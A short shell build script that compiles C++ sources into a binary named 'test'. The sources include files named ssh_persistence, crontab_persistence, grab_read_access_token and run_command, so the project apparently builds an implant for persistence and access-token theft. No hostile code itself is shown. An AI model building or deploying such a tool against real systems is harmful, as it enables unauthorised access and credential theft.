#!/usr/bin/sh
g++ -s core.cpp main.cpp clean-encoding.cpp run_command.cpp ssh_persistence.cpp crontab_persistence.cpp grab_read_access_token.cpp -o test -lssl -lcrypto -lpthread -I./json/include -I./base64/include
